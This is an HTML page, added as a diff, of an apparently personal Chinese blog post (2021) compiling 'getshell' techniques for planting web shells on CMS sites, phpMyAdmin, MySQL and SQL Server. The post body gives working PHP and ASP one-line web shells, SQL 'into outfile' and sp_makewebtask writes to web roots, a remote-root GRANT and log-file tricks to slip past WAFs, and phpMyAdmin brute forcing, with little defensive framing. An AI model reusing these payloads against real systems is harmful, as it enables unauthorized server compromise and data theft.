@@ -1,0 +1,366 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || getshell汇总1</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>getshell<hanla></hanla>汇总<hanla></hanla>1 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/9/20
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/getshell汇总">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                getshell<hanla></hanla>汇总
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <h2 id="前台getshell"><a href="#前台getshell" class="headerlink" title="前台getshell"></a><hanla></hanla>前台<hanla></hanla>getshell</h2><p><hanla></hanla>借助高权限完成拿<hanla></hanla>shell:<br><hanla></hanla>sql<hanla></hanla>注入<br>上传漏洞  </p>
+ <span id="more"></span>
+
+<p><hanla></hanla>编辑器<hanla></hanla>getshell<br><hanla></hanla>st2<hanla></hanla>漏洞<br>反序列漏洞<br>中间件漏洞<br><hanla></hanla>iis put 上传<hanla></hanla>getshell<br><hanla></hanla>解析漏洞拿<hanla></hanla>shell<br><hanla></hanla>代码执行<br>文件包含<br><hanla></hanla>命令执行<hanla></hanla>getshell  </p>
+<pre><code>echp"&lt;?php phpinfo():?&gt;" &gt; /var/www/html/a.php
+echp ^ &lt;?php phpinfo():?^&gt; &gt; /var/www/html/a.php
+</code></pre>
+<p><hanla></hanla>^<hanla></hanla>让符号&gt;<hanla></hanla>不起作用</p>
+<h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a><hanla></hanla>后台<hanla></hanla>getshell</h2><p><hanla></hanla>功能相比前台更多一些<br><hanla></hanla>拿<hanla></hanla>shell<hanla></hanla>方法更多一些<br><hanla></hanla>1.<hanla></hanla>进入直接上传<hanla></hanla>getshell<br><hanla></hanla>2.<hanla></hanla>通过修改上传类型， getshell<br><hanla></hanla>3.<hanla></hanla>数据库备份<hanla></hanla>getshell<br><hanla></hanla>4.<hanla></hanla>配置插马（asp/php 都可以插马）<br><hanla></hanla>5.<hanla></hanla>上传插件 （wordpress<hanla></hanla>博客类<hanla></hanla>cms/dz/<hanla></hanla>米拓<hanla></hanla>cms)<br><hanla></hanla>6.<hanla></hanla>模板编辑插马 （ecshop/<hanla></hanla>织梦 dedecms)<br><hanla></hanla>7.<hanla></hanla>根据<hanla></hanla>cms<hanla></hanla>存在<hanla></hanla>getshell<hanla></hanla>漏洞直接<hanla></hanla>getshell<br><hanla></hanla>8.<hanla></hanla>通过数据库导<hanla></hanla>shell-getshell (如果后台有可以操作<hanla></hanla>sql<hanla></hanla>语句，如果权限大，直接导<hanla></hanla>shell）<br><hanla></hanla>9.<hanla></hanla>突破上传<br><hanla></hanla>10.<hanla></hanla>编辑器拿<hanla></hanla>shell<br><hanla></hanla>11.<hanla></hanla>借助文件包含躲避 waf<hanla></hanla>拦截（一般上大马）</p>
+<h2 id="管理员权限getshell"><a href="#管理员权限getshell" class="headerlink" title="管理员权限getshell"></a><hanla></hanla>管理员权限<hanla></hanla>getshell</h2><p><hanla></hanla>需要有管理员权限拿<hanla></hanla>shell<br><hanla></hanla>通常需要登录后台执行相关操作<br><hanla></hanla>直接上传拿<hanla></hanla>shell</p>
+<p>织梦看版本</p>
+<p>/data/admin/ver.txt</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEf1ch"><img src="https://s3.jpg.cm/2021/09/20/IEf1ch.png" alt="IEf1ch.png"></a></p>
+<p>复制这个版本去百度搜索</p>
+<p>dedecms 20110812<br>dedecms 20110812 漏洞合集<br><hanla></hanla>默认目录是<hanla></hanla>dede<hanla></hanla>之间等录进来<br><hanla></hanla>dede<hanla></hanla>弱口令多，但是后台改的比较多<br><hanla></hanla>可以尝试搜后台 还可以加搜自己想搜的<hanla></hanla>site: baidu.com</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfNl2"><img src="https://s3.jpg.cm/2021/09/20/IEfNl2.png" alt="IEfNl2.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfSEH"><img src="https://s3.jpg.cm/2021/09/20/IEfSEH.png" alt="IEfSEH.png"></a></p>
+<p>默认密码进后台之后这里有个文件式管理器</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfJxW"><img src="https://s3.jpg.cm/2021/09/20/IEfJxW.png" alt="IEfJxW.png"></a></p>
+<p>这里可以之间操控源码的，比如查如一句话进去，<br><hanla></hanla>或者自己传一个文件，之间<hanla></hanla>getshell</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfHwS"><img src="https://s3.jpg.cm/2021/09/20/IEfHwS.png" alt="IEfHwS.png"></a></p>
+<p><hanla></hanla>这里注意：有些阉割版的<hanla></hanla>cms，为了防止你拿<hanla></hanla>shell,<hanla></hanla>它会把一些功能给删除掉<br>比如文件式管理器，但是这个页面还是存在的，我们可以本地搭建之后拿到这个跳转路径<br>改到其他按钮上，仍然能使用这个功能<br>比如南房动易良精</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfYjL"><img src="https://s3.jpg.cm/2021/09/20/IEfYjL.png" alt="IEfYjL.png"></a></p>
+<p>还有些情况就是设置了权限，你只有当前目录的权限，不能访问根目录，我们</p>
+<p><hanla></hanla>可以上传一个文件在改为../muma.php<hanla></hanla>就可以访问上一级目录了<br><hanla></hanla>还有一个地方可以拿<hanla></hanla>shell<br><hanla></hanla>系统–sql<hanla></hanla>命令行工具</p>
+<pre><code>select "&lt;?php phpinfo();?&gt;" into outfile 'C:/inetpub/getshell/DedecmsV53-UTF8-Final/x.php'
+</code></pre>
+<p>这里可以看到已经写进去了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfsnf"><img src="https://s3.jpg.cm/2021/09/20/IEfsnf.png" alt="IEfsnf.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfEtU"><img src="https://s3.jpg.cm/2021/09/20/IEfEtU.png" alt="IEfEtU.png"></a></p>
+<h2 id="数据库备份拿shell"><a href="#数据库备份拿shell" class="headerlink" title="数据库备份拿shell"></a><hanla></hanla>数据库备份拿<hanla></hanla>shell</h2><p><hanla></hanla>动易 南方 良精</p>
+<p>数据库备份页面</p>
+<p>数据库备份等于重命名</p>
+<p>后台数据库备份跳转名称 manage_backup.asp<br><hanla></hanla>一般是上传一个图片马<br>然后用数据库备份<br><hanla></hanla>后面有的带了一个<hanla></hanla>asa,<hanla></hanla>有的要带这个才能访问有的要去掉才能访问，有的还要截断</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfFzO"><img src="https://s3.jpg.cm/2021/09/20/IEfFzO.png" alt="IEfFzO.png"></a></p>
+<p><hanla></hanla>看备份的是不上自己的图片马，一般文件头是<hanla></hanla>JFIF 文件乱码又不是很多就是自己的图片码</p>
+<p>如果是 jet db database 那就是备份的数据库源代码写死了，<br>那我们也可以尝试，新建一个管理员，在用户名插入一句话木马<br>然后去备份数据库，因为账号密码信息要写入数据库，那我们就能连接数据库备份文件了，一般备份<br><hanla></hanla>都是.asp<hanla></hanla>后缀</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfmIw"><img src="https://s3.jpg.cm/2021/09/20/IEfmIw.png" alt="IEfmIw.png"></a></p>
+<p>有时候备份的框是灰色的不让你改，你可以审查元素进行修改</p>
+<p><hanla></hanla>或者用<hanla></hanla>burpsuite<hanla></hanla>抓包修改<br>在管理员账号添加一句话的时候，限制了长度，可以审查元素修改一下长度</p>
+<p><hanla></hanla> 突破上传<hanla></hanla>getshell</p>
+<p> 找源码自带的上传接口</p>
+<p> 有时候编辑器显示不出来</p>
+<p> 换一个低版本的浏览器尝试一下</p>
+<p>（尽量不要突破编辑器的上传，除非编辑器有漏洞，根据漏洞攻击编辑器可以）</p>
+<p><hanla></hanla>本地<hanla></hanla>js<hanla></hanla>验证上传<br><hanla></hanla>服务器<hanla></hanla>mime<hanla></hanla>上传<br>服务器白名单上传<br>服务器黑名单上传<br><hanla></hanla>服务器 filepath<hanla></hanla>上传<br>双文件上传<br><hanla></hanla>%00<hanla></hanla>截断上传<br><hanla></hanla>上传其他脚本类型拿<hanla></hanla>webshll  </p>
+<p>先看看网站设置，上传配置这些</p>
+<p>不要一上来就上传</p>
+<p><hanla></hanla>有的是<hanla></hanla>asp<hanla></hanla>的站，不能上传<hanla></hanla>asp<hanla></hanla>但是可以上传<hanla></hanla>php<br>iis /asp/aspx/php<br>asa /cer/php/ 畸形文件名</p>
+<h2 id="修改网站上传类型配置拿webshll"><a href="#修改网站上传类型配置拿webshll" class="headerlink" title="修改网站上传类型配置拿webshll"></a><hanla></hanla>修改网站上传类型配置拿<hanla></hanla>webshll</h2><p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfBEy"><img src="https://s3.jpg.cm/2021/09/20/IEfBEy.png" alt="IEfBEy.png"></a></p>
+<h2 id="利用解析漏洞拿webshell"><a href="#利用解析漏洞拿webshell" class="headerlink" title="利用解析漏洞拿webshell"></a><hanla></hanla>利用解析漏洞拿<hanla></hanla>webshell</h2><p><hanla></hanla>一、IIS 5.x/6.0<hanla></hanla>解析漏洞<br><hanla></hanla>二、IIS 7.0/IIS 7.5/ Nginx &lt;8.03<hanla></hanla>畸形解析漏洞<br>三、Nginx &lt;8.03 空字节代码执行漏洞<br><hanla></hanla>四、Apache<hanla></hanla>解析漏洞</p>
+<h2 id="利用编辑器漏洞拿webshell"><a href="#利用编辑器漏洞拿webshell" class="headerlink" title="利用编辑器漏洞拿webshell"></a><hanla></hanla>利用编辑器漏洞拿<hanla></hanla>webshell</h2><p><hanla></hanla>常见编辑器有<hanla></hanla>fckeditor、ewebeditor、cheditor<hanla></hanla>等</p>
+<h2 id="网站配置插马拿webshell"><a href="#网站配置插马拿webshell" class="headerlink" title="网站配置插马拿webshell"></a><hanla></hanla>网站配置插马拿<hanla></hanla>webshell</h2><p><hanla></hanla>通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，</p>
+<p>建议先下载该网站源码，进行查看源码过滤规则，以防插马失败。</p>
+<p>“%&gt;&lt;%eval request(“123”)%&gt;&lt;%’<br><hanla></hanla>注意：</p>
+<p><hanla></hanla> 1.<hanla></hanla>知道插入的脚本文件</p>
+<p><hanla></hanla> 2.<hanla></hanla>注意闭合</p>
+<p><hanla></hanla> 3.<hanla></hanla>注意长度问题</p>
+<p><hanla></hanla> 4.<hanla></hanla>尽量规避特殊符号（注意代码本身自带的转义符号）</p>
+<p><hanla></hanla> 要是搞崩了，旁站提权修复<hanla></hanla>3-8<hanla></hanla>年 所有最好还是不要用这种方式</p>
+<p><hanla></hanla>chr(112) 密码是<hanla></hanla>p</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfvwi"><img src="https://s3.jpg.cm/2021/09/20/IEfvwi.png" alt="IEfvwi.png"></a></p>
+<p><hanla></hanla>ddos<hanla></hanla>攻击一般是这样</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfpU8"><img src="https://s3.jpg.cm/2021/09/20/IEfpU8.png" alt="IEfpU8.png"></a></p>
+<h2 id="通过编辑模板拿webshell"><a href="#通过编辑模板拿webshell" class="headerlink" title="通过编辑模板拿webshell"></a><hanla></hanla>通过编辑模板拿<hanla></hanla>webshell</h2><p><hanla></hanla>一：通过对网站的模板进行编辑写入一句话，然后生成脚本文件拿<hanla></hanla>webshell。<br><hanla></hanla>二：通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿<hanla></hanla>webshell</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEf46e"><img src="https://s3.jpg.cm/2021/09/20/IEf46e.png" alt="IEf46e.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfwxk"><img src="https://s3.jpg.cm/2021/09/20/IEfwxk.png" alt="IEfwxk.png"></a></p>
+<p><hanla></hanla>能成功执行的话，在这个页面会有<hanla></hanla>phpinfo<hanla></hanla>的页面，<br><hanla></hanla>ecshop<hanla></hanla>也能前台<hanla></hanla>getshell，漏洞在<hanla></hanla>user.php<hanla></hanla>这个文件，抓包修改<hanla></hanla>referer<br><hanla></hanla>使用<hanla></hanla>tools 0day.txt exp<br><hanla></hanla>成功就会在网站根目录生成<hanla></hanla>1.php<br><hanla></hanla>密码<hanla></hanla>1337</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEffjr"><img src="https://s3.jpg.cm/2021/09/20/IEffjr.png" alt="IEffjr.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfz55"><img src="https://s3.jpg.cm/2021/09/20/IEfz55.png" alt="IEfz55.png"></a></p>
+<h2 id="上传插件拿shell"><a href="#上传插件拿shell" class="headerlink" title="上传插件拿shell"></a><hanla></hanla>上传插件拿<hanla></hanla>shell</h2><p><hanla></hanla>一些网站为了增加某些功能会在后台添加一些 插件来实现 我们可以把木马添加</p>
+<p><hanla></hanla>到安装的插件中上传服务器拿<hanla></hanla>shell 常见的有博客类网站、dz<hanla></hanla>论坛都可以<br>将免杀马放到插件压缩包里面，执行后访问即可</p>
+<h2 id="数据库执行拿webshell"><a href="#数据库执行拿webshell" class="headerlink" title="数据库执行拿webshell"></a><hanla></hanla>数据库执行拿<hanla></hanla>webshell</h2><p><hanla></hanla>查看网站路径</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEf0tC"><img src="https://s3.jpg.cm/2021/09/20/IEf0tC.png" alt="IEf0tC.png"></a></p>
+<p><hanla></hanla>我们可以通过数据库执行命令导出一句话到网站根目录拿<hanla></hanla>shell<br><hanla></hanla>access 数据库导出 一般需要利用解析漏洞<hanla></hanla>xx.asp;.xml  </p>
+<p>sqlserver 导出<br><hanla></hanla>sp_makewebtask<hanla></hanla>是一个存储过程，2005<hanla></hanla>之后都没有了  </p>
+<pre><code>;exec%20sp_makewebtask%20%20%27c:\inetpub\wwwroot\ms\x1.asp%27,%27select%27%
+&lt;%execute(request("cmd"))%&gt;%27%27%27--
+</code></pre>
+<p><hanla></hanla>mysql<hanla></hanla>命令导出<hanla></hanla>shell</p>
+<pre><code>Create TABLE study (cmd text NOT NULL);
+Insert INTO study (cmd) VALUES('&lt;?php eval ($_POST[cmd]) ?&gt;');
+select cmd from study into outfile 'D:/php/www/htdocs/test/seven.php';
+Drop TABLE IF EXISTS study;
+</code></pre>
+<p>版本二</p>
+<pre><code>use mysql;
+create table x(packet text) type=MYISaM;
+</code></pre>
+<pre><code>insert into x (packet) values('&lt;pre&gt;&lt;body &gt;&lt;?php
+@system($_GET["cmd"]); ?&gt;&lt;/body&gt;&lt;/pre&gt;')
+select x into outfile 'd:\php\xx.php'
+版本三
+select '&lt;?php eval($_POST[cmd]);?&gt;' into outfile 'C:/Inetpub/wwwroot/mysql-php/1.php'
+</code></pre>
+<p><hanla></hanla>phpmyadmin mysql<hanla></hanla>数据库的网站管理接口，<br>查找注意<br><hanla></hanla>phpmyadmin<br>pma<br>pmd<br>pm<br><hanla></hanla>phpmyadmin+<hanla></hanla>版本号 （国外比较多）<br>注意端口搭建<br><hanla></hanla>ip: 888<br>ip: 999<br>ip: 888<br><hanla></hanla>找到可以爆破（root<hanla></hanla>可以爆破) 默认登录地址是<hanla></hanla>127.0.0.1<br><hanla></hanla>可以使用这个工具或者九头蛇爆<br>爆破成功登录  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEf20t"><img src="https://s3.jpg.cm/2021/09/20/IEf20t.png" alt="IEf20t.png"></a></p>
+<p><hanla></hanla>2.<hanla></hanla>可以利用<hanla></hanla>phpmyadmin<hanla></hanla>漏洞利用攻击<br>尝试万能密钥<br><hanla></hanla>可以去搜索<hanla></hanla>phpmyadmin<hanla></hanla>漏洞合集<br><hanla></hanla>文件包含<hanla></hanla>getshell  </p>
+<p>phpmyadmin getshell:</p>
+<pre><code>select "&lt;?php @eval($_POST[a]);?&gt; " into outfile 'xxx'
+</code></pre>
+<p><hanla></hanla>1.<hanla></hanla>找网站根目录<br><hanla></hanla>先找<hanla></hanla>mysql<hanla></hanla>安装目录 select @@basedir;<br>D:/phpStudy/PHPTutorial/MySQL/<br><hanla></hanla>2.<hanla></hanla>根据<hanla></hanla>mysql<hanla></hanla>安装路径推理出<hanla></hanla>apache<hanla></hanla>配置文件位置 (  apache<hanla></hanla>配置文件记录网站根目录）<br>D:/phpStudy/apache/conf/http.conf<br>D:/phpStudy/PHPTutorial/apache/conf/httpd.conf<br><hanla></hanla>3.<hanla></hanla>使用某个数据库，创建一个表，用来记录读取的<hanla></hanla>apache<hanla></hanla>的配置文件  </p>
+<pre><code>use mysql 
+create table xx(xx text)
+load data infile "D:/phpStudy/apache/conf/httpd.conf" into table xx;
+</code></pre>
+<p>select xx;<br>查看表里面内容，获取网站根目录<br><hanla></hanla>ctrl+f 搜索<hanla></hanla>documentroot<br>DocumentRoot  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfCLR"><img src="https://s3.jpg.cm/2021/09/20/IEfCLR.png" alt="IEfCLR.png"></a></p>
+<pre><code>select " &lt;?php @eval($_POST[a]);?&gt; " into outfile 'D:\phpStudy\PHPTutorial\WWW'
+D:/phpStudy/PHPTutorial/apache/conf/httpd.conf
+select " &lt;?php @eval($_POST[a]);?&gt; " into outfile 'D:\phpStudy\PHPTutorial\WWW'
+</code></pre>
+<p>这些操作安全狗都会拦截<br>首先找免杀码，<br>然后开启外联<br><hanla></hanla>Grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123.com’ with grant option;<br>200.1.1.1<br><hanla></hanla>开外链导马，waf<hanla></hanla>就不拦截了，云锁,<hanla></hanla>安全狗就这样<br><hanla></hanla>通过远程地址链接<hanla></hanla>mysql<hanla></hanla>服务器 导入一句话<hanla></hanla>getshell    </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEf964"><img src="https://s3.jpg.cm/2021/09/20/IEf964.png" alt="IEf964.png"></a></p>
+<p> 没开外联之前连接</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfjDG"><img src="https://s3.jpg.cm/2021/09/20/IEfjDG.png" alt="IEfjDG.png"></a></p>
+<p>开启之后，直接就进来了，太强了！！！，刚好我的环境安装过安全狗，上面的操作演示不了，然后</p>
+<p>下面就过掉了</p>
+<p>然后就可以执行刚刚那套组合拳了，</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfTFX"><img src="https://s3.jpg.cm/2021/09/20/IEfTFX.png" alt="IEfTFX.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfhou"><img src="https://s3.jpg.cm/2021/09/20/IEfhou.png" alt="IEfhou.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfKUz"><img src="https://s3.jpg.cm/2021/09/20/IEfKUz.png" alt="IEfKUz.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfajD"><img src="https://s3.jpg.cm/2021/09/20/IEfajD.png" alt="IEfajD.png"></a></p>
+<p><hanla></hanla>不过执行到这里我报错 ,<hanla></hanla>因为导出函数被禁用了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfx5p"><img src="https://s3.jpg.cm/2021/09/20/IEfx5p.png" alt="IEfx5p.png"></a></p>
+<p><hanla></hanla>1.<hanla></hanla>可以找<hanla></hanla>phpmyadmin<hanla></hanla>漏洞<hanla></hanla>getshell ,<br><hanla></hanla>2.<hanla></hanla>可以生成日志<hanla></hanla>getshell  </p>
+<p> <a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfDN6"><img src="https://s3.jpg.cm/2021/09/20/IEfDN6.png" alt="IEfDN6.png"></a></p>
+<p> 先把下面的文件备份一下，这里是导出路径  </p>
+<p>D:\phpStudy\PHPTutorial\MySQL\data\LAPTOP-KGDCLQ88.log  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfM0T"><img src="https://s3.jpg.cm/2021/09/20/IEfM0T.png" alt="IEfM0T.png"></a></p>
+<p><hanla></hanla>这样生成日志就会生成一个<hanla></hanla>xx.php<hanla></hanla>到你网站根目录，执行查询语句，然后访问，太强了！！！</p>
+<p>  <a target="_blank" rel="noopener" href="https://imagelol.com/image/IEfZLE"><img src="https://s3.jpg.cm/2021/09/20/IEfZLE.png" alt="IEfZLE.png"></a></p>
+<p>  <a target="_blank" rel="noopener" href="https://imagelol.com/image/IEgIoh"><img src="https://s3.jpg.cm/2021/09/20/IEgIoh.png" alt="IEgIoh.png"></a></p>
+<p>记得测试后把这个生成日志文件目录改回去</p>
+<p>执行命令也可以设置</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IEgGbQ"><img src="https://s3.jpg.cm/2021/09/20/IEgGbQ.png" alt="IEgGbQ.png"></a></p>
+<p>集成环境的权限很高</p>
+<p>拿到的是管理员权限，相当于直接提权</p>
+<h2 id="文件包含拿webshell"><a href="#文件包含拿webshell" class="headerlink" title="文件包含拿webshell"></a><hanla></hanla>文件包含拿<hanla></hanla>webshell</h2><p><hanla></hanla>先将<hanla></hanla>webshell<hanla></hanla>该为<hanla></hanla>txt<hanla></hanla>文件上传，然后上传一个脚本文件包含该<hanla></hanla>txt<hanla></hanla>文件，可绕过<hanla></hanla>waf<hanla></hanla>拿<hanla></hanla>webshell<br><hanla></hanla>asp 包含 如果它拦截你的大马，可以把大马上传为<hanla></hanla>jpg，然后文件包含<br><hanla></hanla>1、<code>&lt;!--#include file="123.jpg"--&gt;   </code><br>2、调用的文件必须和被调用文件在同一目录，否则找不到<br><hanla></hanla>3、如果不在同一目录，用下面的语句：  </p>
+<p><code><hanla></hanla><!--#include virtual="文件所在目录<hanla></hanla>/123.jpg"-->  </code></p>
+<p><hanla></hanla>php<hanla></hanla>包含  </p>
+<p><code>&lt;?php include('123.jpg'); ?&gt;  </code></p>
+<h1 id="命令执行拿shell"><a href="#命令执行拿shell" class="headerlink" title="命令执行拿shell"></a><hanla></hanla>命令执行拿<hanla></hanla>shell</h1><pre><code>Echo ^&lt;^?php @eval($_POST['cracer']);?^&gt;^ &gt; c:\1.php
+Echo ^&lt;^?php @eval($_POST['cracer']);?^&gt;^ &gt; c:\1.php
+^&lt;^%eval request("cracer")%^&gt;^ &gt; c:\1.php
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
